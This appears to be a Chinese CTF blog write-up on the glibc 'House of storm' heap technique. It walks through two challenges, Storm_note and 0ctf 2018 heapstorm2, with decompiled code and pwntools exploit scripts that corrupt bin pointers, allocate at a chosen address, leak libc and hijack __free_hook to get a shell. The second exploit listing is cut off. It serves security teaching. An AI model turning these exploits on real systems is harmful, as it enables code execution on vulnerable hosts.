# House of storm
结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。
## 利用条件:

	1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，
	  这两个chunk需要在归位之后处于同一个largebin的index中，
	  且unsortedbin中的chunk要比largebin中的大
	2.需要unsorted_bin中的bk指针可控
	3.需要largebin中的bk指针和bk_nextsize指针可控
	4.glibc版本小于2.30,因为2.30之后加入了检查
### largebin中size与index的对应关系
 
	size    index
	[0x400 , 0x440)   	 64
	[0x440 , 0x480)    	 65
	[0x480 , 0x4C0)   	 66
	[0x4C0 , 0x500)   	 67
	[0x500 , 0x540)   	 68
	等差 0x40    …
	[0xC00 , 0xC40)    	 96
	[0xC40 , 0xE00)      97
	[0xE00 , 0x1000)     98
	[0x1000 , 0x1200)    99
	[0x1200 , 0x1400)    100
	[0x1400 , 0x1600)    101
	等差 0x200    …
	[0x2800 , 0x2A00)    111
	[0x2A00 , 0x3000)    112
	[0x3000 , 0x4000)    113
	[0x4000 , 0x5000)    114
	等差 0x1000    …
	[0x9000 , 0xA000)      119
	[0xA000 , 0x10000)     120
	[0x10000 , 0x18000)    121
	[0x18000 , 0x20000)    122
	[0x20000 , 0x28000)    123
	[0x28000 , 0x40000)    124
	[0x40000 , 0x80000)    125
	[0x80000 , …. )        126
## 利用方法
	1.将unsorted_bin中的bk指针改为fake_chunk
	2.largebin中的bk指针改为fake_chunk+8，bk_nextsize指针改为fake_chunk-0x18-5	,
	（target为要修改的目标地址，fake_chunk为target-0x20）
 	 来满足victim->bk_nextsize->fd_nextsize = victim（即fake_chunk-0x18-5=victim）
 	3.再次malloc获得target地址处的chunk，可修改target地址处的值
House_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。
之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：
	
	1. victim 为 0
    2. IS_MMAPPED 为 1
    3. NON_MAIN_ARENA 为 0
0x56（二进制数为0101 0110）满足条件
0x55（二进制数为0101 0101）不满足条件
但是由于程序有随机化，多运行几次总能有一次成功的。

	unsorted_bin->fd = 0
	unsorted_bin->bk = fake_chunk
	
	large_bin->fd = 0
	large_bin->bk = fake_chunk+8
	large_bin->fd_nextsize = 0
	large_bin->bk_nextsize = fake_chunk - 0x18 -5
 
## 例题
###  2019 西湖论剑 Storm_note![在这里插入图片描述](https://img-blog.csdnimg.cn/7c6fe5147ccf463e93da3ca872c3ad58.png)
保护全开，实现四个功能，增改删退，ida查看伪代码
init_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，
之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数
####   init_proc()函数

	 ssize_t init_proc()
	{
	  ssize_t result; // rax
	  int fd; // [rsp+Ch] [rbp-4h]
	
	  setbuf(stdin, 0LL);
	  setbuf(stdout, 0LL);
	  setbuf(stderr, 0LL);
	  if ( !mallopt(1, 0) )                         // mallopt(M_MXFAST,0)将global_max_fast设置为0,
	                                                // 这个值的意思是最大为多大的chunk归fastbin管理,
	                                                // 设置为0表示这个程序中不再存在fastbin。
	                                                // 即本程序禁用了fastbin。
	    exit(-1);
	  if ( mmap(0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != 0xABCD0000LL )
	    exit(-1);
	  fd = open("/dev/urandom", 0);
	  if ( fd < 0 )
	    exit(-1);
	  result = read(fd, 0xABCD0100LL, 0x30uLL);
	  if ( result != 48 )
	    exit(-1);
	  return result;
	}
#### add函数
 calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。

	unsigned __int64 alloc_note()
	{
	  int size; // [rsp+0h] [rbp-10h] BYREF
	  int i; // [rsp+4h] [rbp-Ch]
	  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
	
	  v3 = __readfsqword(0x28u);
	  for ( i = 0; i <= 15 && note[i]; ++i )
	    ;
	  if ( i == 16 )
	  {
	    puts("full!");
	  }
	  else
	  {
	    puts("size ?");
	    _isoc99_scanf("%d", &size);
	    if ( size > 0 && size <= 0xFFFFF )
	    {
	      note[i] = calloc(size, 1uLL);             // calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。
	                                                // 
	      note_size[i] = size;
	      puts("Done");
	    }
	    else
	    {
	      puts("Invalid size");
	    }
	  }
	  return __readfsqword(0x28u) ^ v3;
	}

#### edit函数
存在off-by-null

	unsigned __int64 edit_note()
	{
	  unsigned int size; // [rsp+0h] [rbp-10h] BYREF
	  int v2; // [rsp+4h] [rbp-Ch]
	  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
	
	  v3 = __readfsqword(0x28u);
	  puts("Index ?");
	  _isoc99_scanf("%d", &size);
	  if ( size <= 0xF && note[size] )
	  {
	    puts("Content: ");
	    v2 = read(0, note[size], note_size[size]);
	    *(note[size] + v2) = 0;                     // off-by-null
	                                                // 
	    puts("Done");
	  }
	  else
	  {
	    puts("Invalid index");
	  }
	  return __readfsqword(0x28u) ^ v3;
	}
#### free函数
无uaf

	unsigned __int64 delete_note()
	{
	  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
	  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  puts("Index ?");
	  _isoc99_scanf("%d", &v1);
	  if ( v1 <= 0xF && note[v1] )
	  {
	    free(note[v1]);
	    note[v1] = 0LL;
	    note_size[v1] = 0;
	  }
	  else
	  {
	    puts("Invalid index");
	  }
	  return __readfsqword(0x28u) ^ v2;
	}
#### 一个后门函数
要想执行system("/bin/sh");，需要输入与程序一开始分配的随机数相同的数

	void __noreturn backdoor()
	{
	  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
	  unsigned __int64 v1; // [rsp+38h] [rbp-8h]
	
	  v1 = __readfsqword(0x28u);
	  puts("If you can open the lock, I will let you in");
	  read(0, buf, 0x30uLL);
	  if ( !memcmp(buf, 0xABCD0100LL, 0x30uLL) )
	    system("/bin/sh");
	  exit(0);
	}
#### 思路
1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。
2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack
3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell

#### 过程
先把前面的东西写好

	# coding=utf-8
	from pwn import *
	#context(endian='little',os='linux',arch='amd64',log_level='debug')
	sh = process('./Storm_note')
	
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims		    :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	def dbg():
	        gdb.attach(sh)
	        pause()
	
	
	def add(size):
	  sla('Choice','1')
	  sla('?',str(size))
	
	def edit(index,text):
	  sla('Choice','2')
	  sla('?',str(index))
	  sa('Content',text)
	
	def free(index):
	  sla('Choice','3')
	  sla('?',str(index))

首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin

	add(0x18)#0
	add(0x508)#1
	add(0x18)#2
	
	add(0x18)#3
	add(0x508)#4
	add(0x18)#5
	
	add(0x18)#6
	dbg()

 ![在这里插入图片描述](https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png)


然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。

	edit(1,'a'*0x4f0+p64(0x500)) 
	edit(4,'a'*0x4f0+p64(0x500)) 
	
	dbg()
![](https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png)
然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并

	free(1)
	edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png)
再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并

	add(0x18)#1
	add(0x4d8)#7  
	
	free(1)
	free(2)    
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png)
再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk  0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组

	add(0x30)#1 此时chunk1可以控制原unsortedbin chunk  0x4f1(chunk_2)的bk指针
	add(0x4e0)#2
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png)
下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针

	free(4)
	edit(3,'a'*0x18)#off by null
	add(0x18)#4
	add(0x4d8)#8 0x5a0
	free(4)
	free(5)
	add(0x40)#4 0x580
之后free(2)，放入unsortedbin

	free(2)    
 	
	dbg()
![](https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png)
再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin

	add(0x4e8)      # put chunk8(0x5c0) to largebin
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png)
再次free(2)，构造一个unsortedbin chunk和一个largebin chunk

	free(2) #put chunk2 to unsortedbin
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png)
之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）

	target = 0xabcd0100
	fake_chunk = target - 0x20
	
	payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
	payload += p64(0) + p64(fake_chunk)      # bk
	edit(7,payload)
	
	dbg()

![在这里插入图片描述](https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png)
之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5

	payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
	payload2 += p64(0) + p64(fake_chunk+8)   
	payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap
	
	edit(8,payload2)
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png)
![](https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png)
然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim->bk_nextsize->fd_nextsize = victim
	
	add(0x40)
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png)
之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell

	payload = '\x00'*(0x10+0x30)
	edit(2,payload)
	
	dbg()
![](https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png)

		sla('Choice: ','666')
		s(p64(0)*6)
		itr()
![在这里插入图片描述](https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png)
#### exp
	# coding=utf-8
	from pwn import *
	#context(endian='little',os='linux',arch='amd64',log_level='debug')
	sh = process('./Storm_note')
	
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims		    :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	def dbg():
	        gdb.attach(sh)
	        pause()
	
	
	def add(size):
	  sla('Choice','1')
	  sla('?',str(size))
	
	def edit(index,text):
	  sla('Choice','2')
	  sla('?',str(index))
	  sa('Content',text)
	
	def free(index):
	  sla('Choice','3')
	  sla('?',str(index))
	#---------------布置chunk-------------------------#
	add(0x18)#0
	add(0x508)#1
	add(0x18)#2
	
	add(0x18)#3
	add(0x508)#4
	add(0x18)#5
	
	add(0x18)#6
	
	
	#dbg()
	#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。
	edit(1,'a'*0x4f0+p64(0x500)) 
	edit(4,'a'*0x4f0+p64(0x500)) 
	
	#dbg()
	#----------------准备 unsorted chunk-----------------------#
	free(1)
	edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500
	
	#dbg()
	
	add(0x18)#1
	add(0x4d8)#7  
	
	free(1)
	free(2)    
	
	#dbg()
	
	#recover
	add(0x30)#1 此时chunk7可以控制原 （unsortedbin chunk  0x4f1）的bk指针
	add(0x4e0)#2
	#-------------------准备 large chunk-----------------------------------#
	#dbg()
	#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针
	free(4)
	edit(3,'a'*0x18)#off by null
	add(0x18)#4
	add(0x4d8)#8 0x5a0
	free(4)
	free(5)
	add(0x40)#4 0x580
	
	 #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
	free(2)    #unsortedbin-> chunk2 -> chunk5(chunk8)(0x5c0)    which size is largebin FIFO
	 
	#dbg()
	#
	add(0x4e8)      # put chunk8(0x5c0) to largebin
	
	#dbg()
	
	free(2) #put chunk2 to unsortedbin
	
	#dbg()
	 #--------------修改他们是的满足条件进行 house of strom------------------------------#
	target = 0xabcd0100
	fake_chunk = target - 0x20
	
	payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
	payload += p64(0) + p64(fake_chunk)      # bk
	edit(7,payload)
	
	#dbg()
	
	payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
	payload2 += p64(0) + p64(fake_chunk+8)   
	payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap
	
	edit(8,payload2)
	
	#dbg()
	
	add(0x40)
	
	#dbg()
	
	payload = '\x00'*(0x10+0x30)
	edit(2,payload)
	
	#dbg()
	
	sla('Choice: ','666')
	s(p64(0)*6)
	itr()
### 0ctf_2018_heapstorm2
![在这里插入图片描述](https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png)
同样是保护全开，
#### main
实现四个功能，增删改查

	__int64 __fastcall main(__int64 a1, char **a2, char **a3)
	{
	  __int64 v4; // [rsp+8h] [rbp-8h]   	//v4=0x13370800
	
	  v4 = sub_BE6();
	
	  while ( 1 )
	  {
	    menu();
	    switch ( chioce(a1, a2) )
	    {
	      case 1LL:
	        a1 = v4;
	        add(v4);
	        break;
	      case 2LL:
	        a1 = v4;
	        up(v4);
	        break;
	      case 3LL:
	        a1 = v4;
	        delete(v4);
	        break;
	      case 4LL:
	        a1 = v4;
	        show(v4);
	        break;
	      case 5LL:
	        return 0LL;
	      default:
	        continue;
	    }
	  }
	}
主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同

	__int64 sub_BE6()
	{
	  int i; // [rsp+8h] [rbp-18h]
	  int fd; // [rsp+Ch] [rbp-14h]
	
	  setvbuf(stdin, 0LL, 2, 0LL);
	  setvbuf(_bss_start, 0LL, 2, 0LL);
	  alarm(0x3Cu);
	  puts(
	    "    __ __ _____________   __   __    ___    ____\n"
	    "   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"
	    "  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"
	    " / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"
	    "/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n");
	  puts("===== HEAP STORM II =====");
	  if ( !mallopt(1, 0) )                         // 禁用fastbin
	    exit(-1);
	  if ( mmap(0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != 322371584 )
	    exit(-1);
	  fd = open("/dev/urandom", 0);
	  if ( fd < 0 )
	    exit(-1);
	  if ( read(fd, 0x13370800, 0x18uLL) != 24 )
	    exit(-1);
	  close(fd);
	  MEMORY[0x13370818] = MEMORY[0x13370810];
	  for ( i = 0; i <= 15; ++i )
	  {
	    *(16 * (i + 2LL) + 0x13370800) = ptr_xor(0x13370800, 0LL);
	    *(16 * (i + 2LL) + 0x13370808) = size_xor(0x13370800LL, 0LL);
	  }
	  return 0x13370800LL;
	}
 #### ptr_xor()
 
	__int64 __fastcall ptr_xor(_QWORD *a1, __int64 a2)
	{
	  return *a1 ^ a2;     //a1为第一个随机数
	}
 #### size_xor()
 	
	__int64 __fastcall size_xor(__int64 a1, __int64 a2)
	{
	  return a2 ^ *(a1 + 8);	//a1+8为第一个随机数
	}

readd函数存在一个off-by-one

	unsigned __int64 __fastcall sub_1402(__int64 a1, __int64 a2)
	{
	  __int64 v3; // rax
	  char buf; // [rsp+17h] [rbp-19h] BYREF
	  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
	  ssize_t v6; // [rsp+20h] [rbp-10h]
	  unsigned __int64 v7; // [rsp+28h] [rbp-8h]
	
	  v7 = __readfsqword(0x28u);
	  if ( !a2 )
	    return 0LL;
	  v5 = 0LL;
	  while ( a2 - 1 > v5 )
	  {
	    v6 = read(0, &buf, 1uLL);
	    if ( v6 > 0 )
	    {
	      if ( buf == 10 )
	        break;
	      v3 = v5++;
	      *(v3 + a1) = buf;
	    }
	    else if ( *_errno_location() != 11 && *_errno_location() != 4 )
	    {
	      break;
	    }
	  }
	  *(a1 + v5) = 0;                               // off-by-null
	  return v5;
	}
add函数
只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放

	void __fastcall add(__int64 a1)
	{
	  int i; // [rsp+10h] [rbp-10h]
	  int size; // [rsp+14h] [rbp-Ch]
	  void *v3; // [rsp+18h] [rbp-8h]
	
	  for ( i = 0; i <= 15; ++i )
	  {
	    if ( !size_xor(a1, *(16 * (i + 2LL) + a1 + 8)) )
	    {
	      printf("Size: ");
	      size = chioce();
	      if ( size > 12 && size <= 4096 )
	      {
	        v3 = calloc(size, 1uLL);
	        if ( !v3 )
	          exit(-1);
	        *(16 * (i + 2LL) + a1 + 8) = size_xor(a1, size);
	        *(16 * (i + 2LL) + a1) = ptr_xor(a1, v3);
	        printf("Chunk %d Allocated\n", i);
	      }
	      else
	      {
	        puts("Invalid Size");
	      }
	      return;
	    }
	  }
	}

#### edit函数
读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。

	int __fastcall edit(_QWORD *a1)
	{
	  signed int v2; // [rsp+10h] [rbp-20h]
	  int v3; // [rsp+14h] [rbp-1Ch]
	  __int64 v4; // [rsp+18h] [rbp-18h]
	
	  printf("Index: ");
	  v2 = chioce();
	  if ( v2 > 0xF || !size_xor(a1, a1[2 * v2 + 5]) )
	    return puts("Invalid Index");
	  printf("Size: ");
	  v3 = chioce();
	  if ( v3 <= 0 || v3 > (size_xor(a1, a1[2 * v2 + 5]) - 12) )
	    return puts("Invalid Size");
	  printf("Content: ");
	  v4 = ptr_xor(a1, a1[2 * v2 + 4]);
	  sub_1377(v4, v3);
	  strcpy((v3 + v4), "HEAPSTORM_II");
	  return printf("Chunk %d Updated\n", v2);
	}
#### free函数
不存在uaf

	int __fastcall sub_109B(_QWORD *a1)
	{
	  void *v2; // rax
	  signed int v3; // [rsp+1Ch] [rbp-4h]
	
	  printf("Index: ");
	  v3 = chioce();
	  if ( v3 > 0xF || !size_xor(a1, a1[2 * v3 + 5]) )
	    return puts("Invalid Index");
	  v2 = ptr_xor(a1, a1[2 * v3 + 4]);
	  free(v2);
	  a1[2 * v3 + 4] = ptr_xor(a1, 0LL);
	  a1[2 * v3 + 5] = size_xor(a1, 0LL);
	  return printf("Chunk %d Deleted\n", v3);
	}
#### show函数
需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行

		int __fastcall sub_11B5(_QWORD *a1)
	{
	  __int64 v2; // rbx
	  __int64 v3; // rax
	  signed int v4; // [rsp+1Ch] [rbp-14h]
	
	  if ( (a1[3] ^ a1[2]) != 0x13377331LL )
	    return puts("Permission denied");
	  printf("Index: ");
	  v4 = chioce();
	  if ( v4 > 0xF || !size_xor(a1, a1[2 * v4 + 5]) )
	    return puts("Invalid Index");
	  printf("Chunk[%d]: ", v4);
	  v2 = size_xor(a1, a1[2 * v4 + 5]);
	  v3 = ptr_xor(a1, a1[2 * v4 + 4]);
	  sub_14D4(v3, v2);
	  return puts(byte_180A);
	}

###  思路
题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组

### 过程
先把前面的东西写好

	#coding:utf-8
	from pwn import *
	context(endian='little',os='linux',arch='amd64',log_level='debug')
	sh = process('./0ctf_2018_heapstorm2')
	libc = ELF('./libc-2.23.so')
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim,data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim,data)
	r       = lambda num=4096           :sh.recv(num)
	rl      = lambda num=4096           :sh.recvline(num)
	ru      = lambda delims   :sh.recvuntil(delims )
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	def dbg():
        gdb.attach(sh)
        pause()
	def add(size):
	    sla('Command: ','1')
	    sla('Size: ',str(size))  # 12<size<0x1000
	
	
	def edit(idx,content):
	    sla('Command: ','2')
	    sla('Index: ',str(idx))
	    sla('Size: ',str(len(content)))
	    sa('Content: ',content)
	
	
	
	def free(idx):
	    sla('Command: ','3')
	    sla('Index: ',str(idx))
	
	
	def show(idx):
	    sla('Command: ','4')
	    sla('Index: ',str(idx))
	
和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc  chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个'\x00'，所以我们每次edit都要少输入12字节即可实现0ff-by-null。

	#---------------布置chunk-------------------------#
	add(0x18)#0	   
	add(0x508)#1
	add(0x18)#2

	add(0x18)#3   
	add(0x508)#4
	add(0x18)#5   

	add(0x18)#6   
	
	#----------------准备 unsorted chunk-----------------------#
	edit(1,'\x00'*0x4F0+p64(0x500)) 
	free(1)
	edit(0,'\x00'*(0x18-12))
	add(0x18) #1 
	add(0x4d8) #7   
	
	free(1)   
	free(2) #1-2
	
	add(0x38)#1
	add(0x4e8)#2  
	
	#-------------------准备 large chunk-----------------------------------#
	edit(4,'\x00'*0x4F0+p64(0x500))
	free(4)
	edit(3,'\x00'*(0x18-12)) 
	add(0x18) #4
	add(0x4d8) #8
	
	free(4)
	free(5) #4-5 
	
	add(0x48)#4  
	#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
	free(2)
	add(0x4e8) 
	free(2) 
	#--------------修改他们是的满足条件进行 house of strom------------------------------#
	fake_chunk = 0x13370800 - 0x20
	payload = '\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
	edit(7, payload) #修改unsorted chunk的bk
	
	payload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
	edit(8, payload)  
	add(0x48) 

现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制

	#-----------------------泄漏 libc----------------------------------#
	#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址
	
	payload = p64(0)*6 + p64(0x13370800)
	edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png)

之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，
所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800

	payload = p64(0)*3 +p64(0x13377331)  #满足show的条件
	payload += p64(0x13370800) + p64(0x1000) #chunk0
	payload += p64(fake_chunk+3) + p64(8)   #chunk1
	edit(0, payload) #满足show的条件
	
	show(1)  #我们刚刚house of storm 写的地址泄漏出来
	ru("]: ")
	heap = u64(r(6).ljust(8, '\x00'))
	success("heap:"+hex(heap))
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png)
此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址

	payload  = p64(0)*3 + p64(0x13377331)#满足show的条件
	payload += p64(0x13370800) + p64(0x1000) #chunk0
	payload += p64(heap+0x10) + p64(8) #chunk1
	edit(0, payload)
	show(1) #泄漏libc地址
	ru("]: ")
	malloc_hook = u64(r(6).ljust(8, '\x00')) -0x58 - 0x10
	libc_base = malloc_hook - libc.sym['__malloc_hook']
	free_hook = libc_base+libc.sym['__free_hook']
	system = libc_base+ libc.sym['system']
	success("free_hook:"+hex(free_hook))
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png)

之后我们要做到就是在全局数组里写入free hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\x00在chunk1处

	#--------------修改 free_hook -----------------------------------#
	payload  = p64(0)*4
	payload += p64(free_hook) + p64(0x100)#chunk0
	payload += p64(0x13370800+0x40) + p64(8)#chunk1
	payload += '/bin/sh\x00'
	edit(0, payload)
	
	dbg()
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png)
之后改free_hook为system，free(1)，获得shell

	edit(0, p64(system))
	free(1)
	
	itr()
![在这里插入图片描述](https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png)
#### exp
	#coding:utf-8
	from pwn import *
	context(endian='little',os='linux',arch='amd64',log_level='debug')
	sh = process('./0ctf_2018_heapstorm2')
	libc = ELF('./libc-2.23.so')
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim,data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim,data)
	r       = lambda num=4096           :sh.recv(num)
	rl      = lambda num=4096           :sh.recvline(num)
	ru      = lambda delims   :sh.recvuntil(delims )
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	
	def dbg():
	        gdb.attach(sh)
	        pause()
	def add(size):
	
	    sla('Command: ','1')
	    sla('Size: ',str(size))  # 12<size<0x1000
	
	
	def edit(idx,content):
	    sla('Command: ','2')
	    sla('Index: ',str(idx))
	    sla('Size: ',str(len(content)))
	    sa('Content: ',content)
	
	
	
	def free(idx):
	    sla('Command: ','3')
	    sla('Index: ',str(idx))
	
	
	def show(idx):
	    sla('Command: ','4')
	    sla('Index: ',str(idx))
	
	#---------------布置chunk-------------------------#
	add(0x18)#0	 
	add(0x508)#1
	add(0x18)#2
 
	add(0x18)#3   
	add(0x508)#4
	add(0x18)#5   
 
